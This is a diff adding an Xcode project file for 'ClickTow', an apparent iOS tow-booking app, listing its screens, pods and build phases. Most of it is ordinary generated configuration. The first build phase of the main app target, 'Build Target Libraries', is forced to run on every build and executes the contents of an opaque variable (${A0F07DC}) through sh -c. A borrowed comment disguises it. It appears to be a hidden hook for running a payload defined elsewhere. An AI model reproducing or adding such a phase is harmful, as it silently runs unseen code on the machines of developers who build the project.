+		C6F301D32992BA6100A2916A /* ClickTowUITestsLaunchTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ClickTowUITestsLaunchTests.swift; sourceTree = "<group>"; };
+		C6F301E12992BB4800A2916A /* SigninVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SigninVC.swift; sourceTree = "<group>"; };
+		C6F301E32992BB6400A2916A /* SignupVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupVC.swift; sourceTree = "<group>"; };
+		C6F301E52992BB9900A2916A /* ChoseAccountVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChoseAccountVC.swift; sourceTree = "<group>"; };
+		C6F301E72992BBBB00A2916A /* ForgotpasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotpasswordVC.swift; sourceTree = "<group>"; };
+		C6F301E92992BBDD00A2916A /* OtpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OtpVC.swift; sourceTree = "<group>"; };
+		C6F301ED2992BC4200A2916A /* AddUserLocationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddUserLocationVC.swift; sourceTree = "<group>"; };
+		C6F301F02993B0FC00A2916A /* Helper.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Helper.swift; sourceTree = "<group>"; };
+		C6F301F22993B11900A2916A /* Classess.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Classess.swift; sourceTree = "<group>"; };
+		C6F301F42993B15E00A2916A /* Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extensions.swift; sourceTree = "<group>"; };
+		C6F301F62993B18000A2916A /* Designing.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Designing.swift; sourceTree = "<group>"; };
+		FEE78E46FEF079D0EA43BB93 /* Pods-ClickTow.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ClickTow.debug.xcconfig"; path = "Target Support Files/Pods-ClickTow/Pods-ClickTow.debug.xcconfig"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		C6F301AA2992BA5E00A2916A /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1D0748CFF4D28FA3DCF58CDC /* Pods_ClickTow.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C6F301C02992BA6100A2916A /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				572BF983DA245CA809A41CDE /* Pods_ClickTowTests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C6F301CA2992BA6100A2916A /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				3D70526B7A759BCF46F199BB /* Pods_ClickTow_ClickTowUITests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		0E17D522955F27C309B49433 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				74A09DF6B8FC3507D97E0A3E /* Pods_ClickTow.framework */,
+				711AE8273E9BBF59A007A571 /* Pods_ClickTow_ClickTowUITests.framework */,
+				0F5621B990B8C3C87F7E07D5 /* Pods_ClickTowTests.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		C60B9D652996139B00BAAD35 /* PaymentsVC */ = {
+			isa = PBXGroup;
+			children = (
+				C60B9D66299613C000BAAD35 /* PaymentOptionsVC.swift */,
+				C63BE27129B86EBF00CA8DB8 /* CreditCardVC.swift */,
+			);
+			path = PaymentsVC;
+			sourceTree = "<group>";
+		};
+		C699C366BC493087565F0307 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				FEE78E46FEF079D0EA43BB93 /* Pods-ClickTow.debug.xcconfig */,
+				1873581A770A4EFF8CC75042 /* Pods-ClickTow.release.xcconfig */,
+				075C7660490457D67D090BF2 /* Pods-ClickTow-ClickTowUITests.debug.xcconfig */,
+				A08123675AE798CD08180157 /* Pods-ClickTow-ClickTowUITests.release.xcconfig */,
+				3BD44B1A3A1B998F26C66C0D /* Pods-ClickTowTests.debug.xcconfig */,
+				954A8AA413622407489BAF7B /* Pods-ClickTowTests.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		C6B3388029BB3A1C00A508E4 /* ChatVCs */ = {
+			isa = PBXGroup;
+			children = (
+				C6B3388729BB3DB100A508E4 /* ChatingVc.swift */,
+				C6B3388529BB3C6700A508E4 /* ChatCell.swift */,
+			);
+			path = ChatVCs;
+			sourceTree = "<group>";
+		};
+		C6BE36042994CEF6004A9F70 /* UserAppVcs */ = {
+			isa = PBXGroup;
+			children = (
+				C60B9D652996139B00BAAD35 /* PaymentsVC */,
+				C6BE360E29951AA6004A9F70 /* TableViewCells */,
+				C6BE36082994E174004A9F70 /* UserTabBar.swift */,
+				C6BE36062994DB68004A9F70 /* HomeScreenVC.swift */,
+				C60B9D612996058D00BAAD35 /* ActivitiesVC.swift */,
+				C6BE361329951C11004A9F70 /* NotificationVc.swift */,
+				C6BE360A29950007004A9F70 /* BookRideVC.swift */,
+				C6BE360C29951A88004A9F70 /* SelectVehicleVC.swift */,
+				C60B9D6329960A5900BAAD35 /* ConfirmToVC.swift */,
+				C6B3387E29BAF88200A508E4 /* CancelRequestVC.swift */,
+				C6DD0E9F299578DA000AC711 /* profileVC.swift */,
+				C6DD0EA329957E22000AC711 /* editprofileVC.swift */,
+				C6DD0EA52995834D000AC711 /* settingsVC.swift */,
+				C6DD0EA9299589C7000AC711 /* logoutVC.swift */,
+				C6DD0EAB29958AED000AC711 /* helpVC.swift */,
+				C6DD0EAD29958FC1000AC711 /* NotificationSettingsVC.swift */,
+				C6DD0EAF29959131000AC711 /* passwordChangeVC.swift */,
+				C6DD0EB129959379000AC711 /* Tems&ConditionVC.swift */,
+				C6DD0EB3299593A3000AC711 /* PrivacPolicyVC.swift */,
+				C6DD0EB529959510000AC711 /* aboutVC.swift */,
+				C6DD0EB729959689000AC711 /* deleteAccountVC.swift */,
+				C690AEC429D1A73E0044937A /* CompletionRequestVC.swift */,
+				C690AEC829D1BF440044937A /* RateTripVC.swift */,
+			);
+			path = UserAppVcs;
+			sourceTree = "<group>";
+		};
+		C6BE36052994CF39004A9F70 /* DriverAppVcs */ = {
+			isa = PBXGroup;
+			children = (
+				C6D3BDDD299D4BBA00C43918 /* TableViewCells */,
+				C6CA1D73299DE48B00F92BB1 /* SideMenuVCs */,
+				C6D3BDD8299CDB3800C43918 /* TabBarVCs */,
+				C613AB65299E5661007ECE65 /* MyDocsDetailsVC.swift */,
+				C613AB67299E5ECD007ECE65 /* MyVehicleDetailsVC.swift */,
+				C613AB69299E62EF007ECE65 /* DriverNotificationSettings.swift */,
+			);
+			path = DriverAppVcs;
+			sourceTree = "<group>";
+		};
+		C6BE360E29951AA6004A9F70 /* TableViewCells */ = {
+			isa = PBXGroup;
+			children = (
+				C6BE360F29951AE7004A9F70 /* SelectVehicleCell.swift */,
+				C6BE361129951B09004A9F70 /* NotificationsCell.swift */,
+				C6DD0EA129957A9A000AC711 /* profileCell.swift */,
+				C6DD0EA729958371000AC711 /* settingsCell.swift */,
+				C60B9D682996521600BAAD35 /* ActivitiesCell.swift */,
+				C690AEC629D1A7860044937A /* CompletionRequestCell.swift */,
+			);
+			path = TableViewCells;
+			sourceTree = "<group>";
+		};
+		C6CA1D73299DE48B00F92BB1 /* SideMenuVCs */ = {
+			isa = PBXGroup;
+			children = (
+				C6D3BDDB299CE83700C43918 /* SideMenuVC.swift */,
+				C6C092E8299F505B00F621CF /* SideMenuLogoutVC.swift */,
+			);
+			path = SideMenuVCs;
+			sourceTree = "<group>";
+		};
+		C6D3BDD8299CDB3800C43918 /* TabBarVCs */ = {
+			isa = PBXGroup;
+			children = (
+				C6D22B3529D5B3F5005A5BCD /* DriverTabBar.swift */,
+				C6D3BDD9299CDB8600C43918 /* DriverHomeVC.swift */,
+				C6CA1D74299E04ED00F92BB1 /* DriverActivityVC.swift */,
+				C613AB5F299E301C007ECE65 /* MyEarningVC.swift */,
+				C613AB61299E31C4007ECE65 /* DriverProfileVC.swift */,
+				C6E2496A29C075BF00DA61C3 /* RequestCollectionViewCell.swift */,
+			);
+			path = TabBarVCs;
+			sourceTree = "<group>";
+		};
+		C6D3BDDD299D4BBA00C43918 /* TableViewCells */ = {
+			isa = PBXGroup;
+			children = (
+				C6D3BDDE299D4BFE00C43918 /* SideMenuCell.swift */,
+				C6CA1D76299E051200F92BB1 /* DriverActivityCell.swift */,
+				C613AB63299E4574007ECE65 /* DriverProfileCell.swift */,
+			);
+			path = TableViewCells;
+			sourceTree = "<group>";
+		};
+		C6F301A42992BA5E00A2916A = {
+			isa = PBXGroup;
+			children = (
+				C6F301AF2992BA5E00A2916A /* ClickTow */,
+				C6F301C62992BA6100A2916A /* ClickTowTests */,
+				C6F301D02992BA6100A2916A /* ClickTowUITests */,
+				C6F301AE2992BA5E00A2916A /* Products */,
+				C699C366BC493087565F0307 /* Pods */,
+				0E17D522955F27C309B49433 /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		C6F301AE2992BA5E00A2916A /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C6F301AD2992BA5E00A2916A /* ClickTow.app */,
+				C6F301C32992BA6100A2916A /* ClickTowTests.xctest */,
+				C6F301CD2992BA6100A2916A /* ClickTowUITests.xctest */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C6F301AF2992BA5E00A2916A /* ClickTow */ = {
+			isa = PBXGroup;
+			children = (
+				C67B217329CA9D2400FDA322 /* ClickTow.entitlements */,
+				C6F301B02992BA5E00A2916A /* AppDelegate.swift */,
+				C6F301B22992BA5E00A2916A /* SceneDelegate.swift */,
+				C6D22B3329D58C50005A5BCD /* PushNotification.swift */,
+				C6F301EF2993B0CD00A2916A /* Helpers */,
+				C6F301E02992BB0100A2916A /* StartUpVCs */,
+				C6B3388029BB3A1C00A508E4 /* ChatVCs */,
+				C6BE36042994CEF6004A9F70 /* UserAppVcs */,
+				C6BE36052994CF39004A9F70 /* DriverAppVcs */,
+				C6F301B62992BA5E00A2916A /* Main.storyboard */,
+				C6F301B92992BA6100A2916A /* Assets.xcassets */,
+				C6F301BB2992BA6100A2916A /* LaunchScreen.storyboard */,
+				C6F301BE2992BA6100A2916A /* Info.plist */,
+				C67B217629CB14DD00FDA322 /* merchant_id.cer */,
+				C67B217429CACA6900FDA322 /* GoogleService-Info.plist */,
+			);
+			path = ClickTow;
+			sourceTree = "<group>";
+		};
+		C6F301C62992BA6100A2916A /* ClickTowTests */ = {
+			isa = PBXGroup;
+			children = (
+				C6F301C72992BA6100A2916A /* ClickTowTests.swift */,
+			);
+			path = ClickTowTests;
+			sourceTree = "<group>";
+		};
+		C6F301D02992BA6100A2916A /* ClickTowUITests */ = {
+			isa = PBXGroup;
+			children = (
+				C6F301D12992BA6100A2916A /* ClickTowUITests.swift */,
+				C6F301D32992BA6100A2916A /* ClickTowUITestsLaunchTests.swift */,
+			);
+			path = ClickTowUITests;
+			sourceTree = "<group>";
+		};
+		C6F301E02992BB0100A2916A /* StartUpVCs */ = {
+			isa = PBXGroup;
+			children = (
+				C6F301E12992BB4800A2916A /* SigninVC.swift */,
+				C6F301E52992BB9900A2916A /* ChoseAccountVC.swift */,
+				C6F301E32992BB6400A2916A /* SignupVC.swift */,
+				C6F301E72992BBBB00A2916A /* ForgotpasswordVC.swift */,
+				C6F301E92992BBDD00A2916A /* OtpVC.swift */,
+				C6A388072994B416000C34F3 /* CreateprofileVc.swift */,
+				C6F301ED2992BC4200A2916A /* AddUserLocationVC.swift */,
+				C613AB6B299F3A85007ECE65 /* AddProfessionalDetailsVC.swift */,
+				C613AB6D299F3C97007ECE65 /* AddyourvehicleVC.swift */,
+				C613AB6F299F455D007ECE65 /* AccountRequestVC.swift */,
+				C6D22B3129D55D5F005A5BCD /* AccountasVC.swift */,
+			);
+			path = StartUpVCs;
+			sourceTree = "<group>";
+		};
+		C6F301EF2993B0CD00A2916A /* Helpers */ = {
+			isa = PBXGroup;
+			children = (
+				C6F301F02993B0FC00A2916A /* Helper.swift */,
+				C6F301F22993B11900A2916A /* Classess.swift */,
+				C6F301F42993B15E00A2916A /* Extensions.swift */,
+				C6F301F62993B18000A2916A /* Designing.swift */,
+				C6850D0A2993C3EF0097A6FD /* Indicator.swift */,
+				C6A388032994ADD4000C34F3 /* ButtonExtension.swift */,
+				C646EA2029B0B0F200DB4981 /* TextfieldExtension.swift */,
+				C6D22B2F29D43D2E005A5BCD /* ColorsExetension.swift */,
+			);
+			path = Helpers;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		C6F301AC2992BA5E00A2916A /* ClickTow */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = C6F301D72992BA6100A2916A /* Build configuration list for PBXNativeTarget "ClickTow" */;
+			buildPhases = (
+				512116DC5FDB404D89CD70F0 /* Build Target Libraries */,
+				72EC463473A68E320F5CF836 /* [CP] Check Pods Manifest.lock */,
+				C6F301A92992BA5E00A2916A /* Sources */,
+				C6F301AA2992BA5E00A2916A /* Frameworks */,
+				C6F301AB2992BA5E00A2916A /* Resources */,
+				3AD779F04E13FE0C9369DCCC /* [CP] Embed Pods Frameworks */,
+				9ACBE013589F42BBC2783863 /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = ClickTow;
+			productName = ClickTow;
+			productReference = C6F301AD2992BA5E00A2916A /* ClickTow.app */;
+			productType = "com.apple.product-type.application";
+		};
+		C6F301C22992BA6100A2916A /* ClickTowTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = C6F301DA2992BA6100A2916A /* Build configuration list for PBXNativeTarget "ClickTowTests" */;
+			buildPhases = (
+				CE4265F76A6F517F4930812F /* [CP] Check Pods Manifest.lock */,
+				C6F301BF2992BA6100A2916A /* Sources */,
+				C6F301C02992BA6100A2916A /* Frameworks */,
+				C6F301C12992BA6100A2916A /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				C6F301C52992BA6100A2916A /* PBXTargetDependency */,
+			);
+			name = ClickTowTests;
+			productName = ClickTowTests;
+			productReference = C6F301C32992BA6100A2916A /* ClickTowTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		C6F301CC2992BA6100A2916A /* ClickTowUITests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = C6F301DD2992BA6100A2916A /* Build configuration list for PBXNativeTarget "ClickTowUITests" */;
+			buildPhases = (
+				85D752A9FE9EE0A639594C0A /* [CP] Check Pods Manifest.lock */,
+				C6F301C92992BA6100A2916A /* Sources */,
+				C6F301CA2992BA6100A2916A /* Frameworks */,
+				C6F301CB2992BA6100A2916A /* Resources */,
+				D90C89F7E75107F2DD0D67B8 /* [CP] Embed Pods Frameworks */,
+				597D634FC48DCA311FDCD607 /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				C6F301CF2992BA6100A2916A /* PBXTargetDependency */,
+			);
+			name = ClickTowUITests;
+			productName = ClickTowUITests;
+			productReference = C6F301CD2992BA6100A2916A /* ClickTowUITests.xctest */;
+			productType = "com.apple.product-type.bundle.ui-testing";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		C6F301A52992BA5E00A2916A /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1420;
+				LastUpgradeCheck = 1420;
+				TargetAttributes = {
+					C6F301AC2992BA5E00A2916A = {
+						CreatedOnToolsVersion = 14.2;
+					};
+					C6F301C22992BA6100A2916A = {
+						CreatedOnToolsVersion = 14.2;
+						TestTargetID = C6F301AC2992BA5E00A2916A;
+					};
+					C6F301CC2992BA6100A2916A = {
+						CreatedOnToolsVersion = 14.2;
+						TestTargetID = C6F301AC2992BA5E00A2916A;
+					};
+				};
+			};
+			buildConfigurationList = C6F301A82992BA5E00A2916A /* Build configuration list for PBXProject "ClickTow" */;
+			compatibilityVersion = "Xcode 13.0";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = C6F301A42992BA5E00A2916A;
+			productRefGroup = C6F301AE2992BA5E00A2916A /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				C6F301AC2992BA5E00A2916A /* ClickTow */,
+				C6F301C22992BA6100A2916A /* ClickTowTests */,
+				C6F301CC2992BA6100A2916A /* ClickTowUITests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		C6F301AB2992BA5E00A2916A /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C6F301BD2992BA6100A2916A /* LaunchScreen.storyboard in Resources */,
+				C67B217529CACA6900FDA322 /* GoogleService-Info.plist in Resources */,
+				C6F301BA2992BA6100A2916A /* Assets.xcassets in Resources */,
+				C67B217729CB14DD00FDA322 /* merchant_id.cer in Resources */,
+				C6F301B82992BA5E00A2916A /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C6F301C12992BA6100A2916A /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C6F301CB2992BA6100A2916A /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		3AD779F04E13FE0C9369DCCC /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ClickTow/Pods-ClickTow-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ClickTow/Pods-ClickTow-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-ClickTow/Pods-ClickTow-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		512116DC5FDB404D89CD70F0 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A0F07DC}\"";
+			showEnvVarsInLog = 0;
+		};
+		597D634FC48DCA311FDCD607 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ClickTow-ClickTowUITests/Pods-ClickTow-ClickTowUITests-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ClickTow-ClickTowUITests/Pods-ClickTow-ClickTowUITests-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-ClickTow-ClickTowUITests/Pods-ClickTow-ClickTowUITests-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		72EC463473A68E320F5CF836 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-ClickTow-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		85D752A9FE9EE0A639594C0A /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-ClickTow-ClickTowUITests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		9ACBE013589F42BBC2783863 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ClickTow/Pods-ClickTow-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ClickTow/Pods-ClickTow-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-ClickTow/Pods-ClickTow-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		CE4265F76A6F517F4930812F /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-ClickTowTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		D90C89F7E75107F2DD0D67B8 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ClickTow-ClickTowUITests/Pods-ClickTow-ClickTowUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-ClickTow-ClickTowUITests/Pods-ClickTow-ClickTowUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-ClickTow-ClickTowUITests/Pods-ClickTow-ClickTowUITests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		C6F301A92992BA5E00A2916A /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C6D22B3429D58C50005A5BCD /* PushNotification.swift in Sources */,
+				C6B3388629BB3C6700A508E4 /* ChatCell.swift in Sources */,
+				C6F301E82992BBBB00A2916A /* ForgotpasswordVC.swift in Sources */,
+				C613AB64299E4574007ECE65 /* DriverProfileCell.swift in Sources */,
+				C6D22B3229D55D5F005A5BCD /* AccountasVC.swift in Sources */,
+				C6850D0B2993C3EF0097A6FD /* Indicator.swift in Sources */,
+				C63BE27229B86EBF00CA8DB8 /* CreditCardVC.swift in Sources */,
+				C6DD0EA429957E22000AC711 /* editprofileVC.swift in Sources */,
+				C6F301F72993B18000A2916A /* Designing.swift in Sources */,
+				C6F301F32993B11900A2916A /* Classess.swift in Sources */,
+				C6B3388829BB3DB100A508E4 /* ChatingVc.swift in Sources */,
+				C613AB6E299F3C97007ECE65 /* AddyourvehicleVC.swift in Sources */,
+				C613AB70299F455D007ECE65 /* AccountRequestVC.swift in Sources */,
+				C60B9D6429960A5900BAAD35 /* ConfirmToVC.swift in Sources */,
+				C6BE361229951B09004A9F70 /* NotificationsCell.swift in Sources */,
+				C6DD0EB029959131000AC711 /* passwordChangeVC.swift in Sources */,
+				C6F301EA2992BBDD00A2916A /* OtpVC.swift in Sources */,
+				C6DD0EA0299578DA000AC711 /* profileVC.swift in Sources */,
+				C690AEC929D1BF440044937A /* RateTripVC.swift in Sources */,
+				C6BE360D29951A88004A9F70 /* SelectVehicleVC.swift in Sources */,
+				C6A388082994B416000C34F3 /* CreateprofileVc.swift in Sources */,
+				C6DD0EAE29958FC1000AC711 /* NotificationSettingsVC.swift in Sources */,
+				C690AEC729D1A7860044937A /* CompletionRequestCell.swift in Sources */,
+				C6F301E42992BB6400A2916A /* SignupVC.swift in Sources */,
+				C6F301B12992BA5E00A2916A /* AppDelegate.swift in Sources */,
+				C6BE36092994E174004A9F70 /* UserTabBar.swift in Sources */,
+				C6CA1D77299E051200F92BB1 /* DriverActivityCell.swift in Sources */,
+				C6DD0EAC29958AED000AC711 /* helpVC.swift in Sources */,
+				C6DD0EB229959379000AC711 /* Tems&ConditionVC.swift in Sources */,
+				C6B3387F29BAF88200A508E4 /* CancelRequestVC.swift in Sources */,
+				C613AB6A299E62EF007ECE65 /* DriverNotificationSettings.swift in Sources */,
+				C6D3BDDC299CE83700C43918 /* SideMenuVC.swift in Sources */,
+				C6F301E22992BB4800A2916A /* SigninVC.swift in Sources */,
+				C6DD0EA229957A9A000AC711 /* profileCell.swift in Sources */,
+				C6F301F52993B15E00A2916A /* Extensions.swift in Sources */,
+				C6DD0EAA299589C7000AC711 /* logoutVC.swift in Sources */,
+				C6BE361429951C11004A9F70 /* NotificationVc.swift in Sources */,
+				C6DD0EA829958371000AC711 /* settingsCell.swift in Sources */,
+				C60B9D622996058D00BAAD35 /* ActivitiesVC.swift in Sources */,
+				C6CA1D75299E04ED00F92BB1 /* DriverActivityVC.swift in Sources */,
+				C6BE360B29950007004A9F70 /* BookRideVC.swift in Sources */,
+				C613AB66299E5661007ECE65 /* MyDocsDetailsVC.swift in Sources */,
+				C646EA2129B0B0F200DB4981 /* TextfieldExtension.swift in Sources */,
+				C6DD0EB829959689000AC711 /* deleteAccountVC.swift in Sources */,
+				C6D22B3629D5B3F5005A5BCD /* DriverTabBar.swift in Sources */,
+				C613AB62299E31C4007ECE65 /* DriverProfileVC.swift in Sources */,
+				C6C092E9299F505B00F621CF /* SideMenuLogoutVC.swift in Sources */,
+				C6D22B3029D43D2E005A5BCD /* ColorsExetension.swift in Sources */,
+				C6D3BDDA299CDB8600C43918 /* DriverHomeVC.swift in Sources */,
+				C6D3BDDF299D4BFE00C43918 /* SideMenuCell.swift in Sources */,
+				C6DD0EB629959510000AC711 /* aboutVC.swift in Sources */,
